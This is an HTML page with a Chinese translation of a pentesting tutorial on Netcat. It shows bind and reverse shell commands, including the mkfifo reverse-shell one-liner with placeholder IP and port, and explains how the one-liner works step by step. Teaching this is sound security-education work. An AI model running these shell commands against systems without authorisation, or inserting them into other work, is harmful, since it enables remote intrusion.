<html>
<head>
<title>Create Bind and Reverse Shells using Netcat</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">使用Netcat创建绑定和反向Shells</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/create-bind-and-reverse-shells-using-netcat-c53b23df8059?source=collection_archive---------1-----------------------#2022-04-18">https://infosecwriteups.com/create-bind-and-reverse-shells-using-netcat-c53b23df8059?source=collection_archive---------1-----------------------#2022-04-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="799e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Netcat  ( <strong class="jp ir"> nc </strong>，<strong class="jp ir"> ncat </strong>，或者有些人可能更喜欢称之为网络的瑞士军刀)是一个命令行实用程序，每个有自尊的pentester都应该随身携带。攻击者经常使用Netcat在目标机器上创建反向外壳。本文将介绍实现这一点的不同方法。</p><p id="e30e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在开始之前，本文假设您对网络、计算机如何通信以及什么是端口和IP地址有基本的了解。如果这听起来像中文，那么你应该先学习一下计算机网络。Patchthenet的入门<a class="ae kl" href="https://patchthenet.com/computer-networking/" rel="noopener ugc nofollow" target="_blank">网络教程</a>是一个很好的起点。</p><p id="03d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">话虽如此，我们还是开门见山吧。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/f1b126d4593ba5569042e9523423dd53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/0*r4sPBeXTtnYRySNe.jpg"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="b01e" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Netcat简介</h1><p id="e89d" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated"><strong class="jp ir"> Netcat </strong>是一个命令行工具，用于建立TCP和UDP网络连接，并对它们进行读/写。</p><p id="86c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">试图解释这个工具的不同应用将需要一整本书，而不仅仅是一篇文章。</p><p id="9af0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，为了避免冗长的帖子让你厌烦，我们将在这里介绍Netcat在Pentesting和Ethical Hacking中的基本用法，因为这就是我们在这里的目的，对吗？</p><p id="c3a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在最基本的层面上，Netcat只是一个通过网络与两个节点之间的连接进行交互(读/写)的工具。</p><h2 id="5941" class="me lc iq bd ld mf mg dn lh mh mi dp ll jy mj mk lp kc ml mm lt kg mn mo lx mp bi translated">使用Netcat创建网络连接</h2><p id="cafa" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">为了在两个节点之间建立网络连接，其中一个节点需要监听特定的端口，而另一个节点启动到该端口的连接。</p><p id="9b7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在第一个节点上，您可以通过运行以下命令来激活监听端口。</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="4a34" class="me lc iq mr b gy mv mw l mx my">nc -l -p &lt;Port-Number&gt;</span></pre><p id="ad23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">l标志表示您正在监听模式下运行Netcat。</p><p id="87e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您必须在-p标志后指定一个数字，以指示Netcat将监听哪个端口。</p><p id="0ed4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦运行了上面的命令，节点将打开指定的端口并等待传入的连接。</p><p id="caf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在可以转到第二台机器并启动与监听节点的连接。</p><p id="7185" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，您可以运行以下命令:</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="0d18" class="me lc iq mr b gy mv mw l mx my">nc &lt;IP-Address&gt; &lt;Port-Number&gt;</span></pre><p id="3154" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">提供的IP地址应该是监听节点的IP地址，端口号与我们之前用-p标志指定的端口号相同。</p><p id="ef8e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，为了用一个真实的例子演示它是如何工作的，我启动了两个终端，并键入我们刚刚学习的两个命令来模拟一个连接。结果如下:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi mz"><img src="../Images/c6a959200a4137502bb962c4848d80b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*K0R11f3a2fMYWnkF.png"/></div></div></figure><p id="9819" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于listener命令，我们可以添加-v标志，这将使Netcat更加冗长。这将在连接建立时显示一条消息，比黑屏更方便。</p><p id="a8df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还可以添加-n标志，这将告诉Netcat我们只处理IP地址，不需要DNS名称解析。这将使它更快。</p><p id="3379" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过组合所有这些标志，生成的侦听器命令将如下所示:</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="fe3d" class="me lc iq mr b gy mv mw l mx my">nc -lvnp &lt;Port-number&gt;</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5d2c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">使用Netcat绑定和反转Shells</h1><p id="5754" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">现在我们已经对Netcat的工作原理有了一个概念，让我们花一点时间来讨论一些理论。</p><p id="ad01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除非你是黑客或一般计算机科学的新手，否则你应该对shell 有所了解。好吧，以防你不知道(这没什么不好意思的，我们都是来学习的)，这里有一个简短的定义。</p><p id="4603" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个<strong class="jp ir"> shell </strong>基本上是任何一个从用户那里接受命令并把它们发送到操作系统层执行的程序。然后，它将这个执行的结果发送回用户。</p><p id="001b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Bash、cmd和Powershell都是流行shell的例子。</p><p id="e937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作为pentester，有时您会成功利用目标系统上的远程代码执行漏洞。现在，为了获得对该系统的初始访问权，您必须生成一个shell，它将允许您在目标操作系统上交互式地运行命令。</p><p id="6167" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要执行此操作，您将有两条路可走:<strong class="jp ir">绑定</strong>或<strong class="jp ir">反向外壳</strong>。</p><h2 id="7cc4" class="me lc iq bd ld mf mg dn lh mh mi dp ll jy mj mk lp kc ml mm lt kg mn mo lx mp bi translated">绑定外壳</h2><p id="98a8" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">生成bind shell要求您在目标系统上运行一个监听器，然后从您的机器上连接到该监听器。</p><p id="0685" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">建立连接的命令将与我们在上一节中看到的命令相同。</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="9560" class="me lc iq mr b gy mv mw l mx my">nc &lt;IP-address&gt; &lt;Port-number&gt;</span></pre><p id="2425" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，对于第二个命令，会有一点点不同。</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="c5ec" class="me lc iq mr b gy mv mw l mx my">nc -lvnp &lt;Port-number&gt; -e /bin/bash</span></pre><p id="da83" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当试图激活一个监听器时，<code class="fe ne nf ng mr b">nc</code>命令会有另一个选项<code class="fe ne nf ng mr b">-e</code>。当您使用此标志时，Netcat将在建立连接后执行指定的命令。在这种情况下，我们提供了<code class="fe ne nf ng mr b">/bin/bash</code>作为将要执行的命令。当连接建立后，这将在目标机器上给我们一个bash shell。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nh"><img src="../Images/d812a96483289986d512913fd412d4b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*a_4qpt20ose78HPx.png"/></div></div></figure><p id="b413" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意，这个命令只在Linux系统中有效。在Windows的情况下，有必要进行小的调整。你可以简单地用<code class="fe ne nf ng mr b">cmd.exe</code>代替<code class="fe ne nf ng mr b">/bin/bash</code>。</p><h2 id="a61c" class="me lc iq bd ld mf mg dn lh mh mi dp ll jy mj mk lp kc ml mm lt kg mn mo lx mp bi translated">反向外壳</h2><p id="8f6c" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">在反向shell中，黑客往往比绑定shell使用得更多，攻击者将在他们的机器上运行一个监听器。然后，他们将通过在目标机器上运行命令来启动连接，该命令将连接回攻击者正在运行的侦听器。</p><p id="1856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要生成反向shell，您应该首先在您的机器上运行一个简单的监听器。</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="7885" class="me lc iq mr b gy mv mw l mx my">nc -lvnp &lt;Port-number&gt;</span></pre><p id="f504" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一方面，在目标机器上运行命令时，我们必须提供-e选项。</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="1107" class="me lc iq mr b gy mv mw l mx my">nc &lt;IP-address&gt; &lt;Port-number&gt; -e /bin/bash</span></pre><p id="eefc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦我们运行上面的命令，我们应该在我们的机器上得到一个反向的shell。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi nh"><img src="../Images/41e45cf60a4456c3b514264fcb1b9ec4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9kHGpGp3t__qeJjD.png"/></div></div></figure><p id="cf65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里还是那句话，如果你针对的是Windows机器，可以用<code class="fe ne nf ng mr b">cmd.exe</code>换<code class="fe ne nf ng mr b">/bin/bash</code>。</p><h2 id="e742" class="me lc iq bd ld mf mg dn lh mh mi dp ll jy mj mk lp kc ml mm lt kg mn mo lx mp bi translated">Mkfifo和Netcat单行反向Shell</h2><p id="19dc" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">在结束本文之前，我们应该讨论一个重要的命令。这是一个在黑客社区中非常流行的工具，经常被用来生成反向外壳。</p><p id="5ded" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有时，产生反向外壳的经典方法可能不起作用。当那发生时，你将不得不拿出大枪。这个一行程序会给你外壳，而其他人不会。你应该把它添加到你的测试库中，放在手边。</p><pre class="kn ko kp kq gt mq mr ms mt aw mu bi"><span id="085a" class="me lc iq mr b gy mv mw l mx my">rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP-Address&gt; &lt;Port-number&gt; &gt;/tmp/f</span></pre><p id="794c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不要每次需要这个命令的时候都在不知道它如何工作的情况下复制并粘贴它，了解它如何工作以及为什么工作不是很好吗？好吧，如果你同意，那么这就是我们将要在这一部分讨论的内容。</p><p id="d633" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以将这一行分解为3个命令:</p><ul class=""><li id="3fa8" class="ni nj iq jp b jq jr ju jv jy nk kc nl kg nm kk nn no np nq bi translated">rm -f /tmp/f</li><li id="a1de" class="ni nj iq jp b jq nr ju ns jy nt kc nu kg nv kk nn no np nq bi translated">mkfifo /tmp/f</li><li id="3f42" class="ni nj iq jp b jq nr ju ns jy nt kc nu kg nv kk nn no np nq bi translated">cat/tmp/f |/bin/sh-I 2 &gt; &amp; 1 | NC<ip-address><port-number>&gt;/tmp/f</port-number></ip-address></li></ul><p id="a059" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">我们来分解一下</strong></p><p id="49a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，第一个命令很简单。如果文件/tmp/f已经存在，它只是删除它。</p><p id="92b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们使用命令<em class="nw"> mkfifo </em>创建一个命名管道。一个<strong class="jp ir">命名管道</strong>(或FIFO文件)基本上是一个多个进程可以读写的文件。因此，当进程需要交换数据时，可以使用它。</p><p id="d781" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我们进入最后一个也是最有趣的命令:<code class="fe ne nf ng mr b">cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP-Address&gt; &lt;Port-Number&gt; &gt; /tmp/f</code></p><p id="2734" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该命令将首先读取前一个命令创建的FIFO文件的内容(<code class="fe ne nf ng mr b">cat /tmp/f</code>)，并将其内容发送到<code class="fe ne nf ng mr b">/bin/sh -i</code>。这将执行文件<code class="fe ne nf ng mr b">/tmp/f</code>中的任何命令。</p><p id="44da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，<em class="nw"> stderr </em>将被重定向到<em class="nw"> stdout </em>，这是由命令的<code class="fe ne nf ng mr b">2&gt;&amp;1</code>部分暗示的。换句话说，这将把命令生成的任何错误重定向到标准输出。</p><p id="c269" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下一步中，Netcat将把它从前面的命令中接收到的标准输出发送到具有给定IP地址和给定端口的主机:<code class="fe ne nf ng mr b">nc &lt;IP-Address&gt; &lt;Port-Number&gt;</code>。当然，这假定有一台具有该IP地址的主机正在侦听该端口。</p><p id="d49e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，netcat将把它从远程主机接收到的任何数据发送到FIFO文件<code class="fe ne nf ng mr b">&gt; /tmp/f</code>。</p><p id="558a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，通过读取/tmp/f，使用/bin/sh运行其内容，以此类推，循环再次开始</p><p id="cf3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了使这个过程更加清晰，我绘制了一幅图，展示了使用这个命令生成反向shell时会发生什么。这里，我们假设攻击者在反向shell上运行命令<em class="nw"> whoami </em>。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/685fae4c95d3070fc73fdd0bdd0a124c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/0*gCB19x1UCW84P0dW.jpg"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="efb4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">结论</h1><p id="9369" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我们已经到了这篇文章的结尾。我们已经学习了如何使用Netcat，什么是绑定和反向shells，如何使用Netcat创建它们，最后，我们分解了mkfifo netcat一行程序。现在，Netcat对你来说应该不再是一个谜了。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><p id="5d06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nw">原载于2022年4月18日</em><a class="ae kl" href="https://patchthenet.com/articles/create-bind-and-reverse-shells-using-netcat/" rel="noopener ugc nofollow" target="_blank"><em class="nw">【https://patchthenet.com】</em></a><em class="nw">。</em></p></div></div>    
</body>
</html>